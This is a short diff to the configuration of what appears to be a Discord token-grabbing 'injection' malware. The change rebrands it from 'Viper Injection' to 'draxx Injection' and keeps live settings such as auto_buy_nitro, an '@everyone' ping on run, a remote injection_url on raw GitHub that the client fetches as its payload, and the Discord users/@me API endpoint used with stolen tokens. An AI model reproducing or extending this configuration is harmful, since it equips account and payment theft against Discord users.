@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Viper Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1370971205624135823/1370985478555177061/ffd29db1f8ec7a835809a0308f57828a.webp?ex=68217d39&is=68202bb9&hm=e773989080797506ca74a1495caf5d5fa5052e805d997c3612c6d1da977aaeb7&=&format=webp'.replace(/ /g, '%20'),
-  embed_color: 15548997, 
+  embed_name: 'draxx Injection', 
+  embed_icon: 'https://media.discordapp.net/attachments/1373332015574679673/1373334198403993660/butterfl.jpg?ex=682a08a4&is=6828b724&hm=f7044dcd1499537c7ab5943bbcf2e1b4ab71ad84f6a88169f5a9b16227434b5f&=&format=webp'.replace(/ /g, '%20'),
+  embed_color: 000, 
   injection_url: 'https://raw.githubusercontent.com/savv70/injection/refs/heads/main/injection_v2', 
 
   api: 'https://discord.com/api/v9/users/@me',
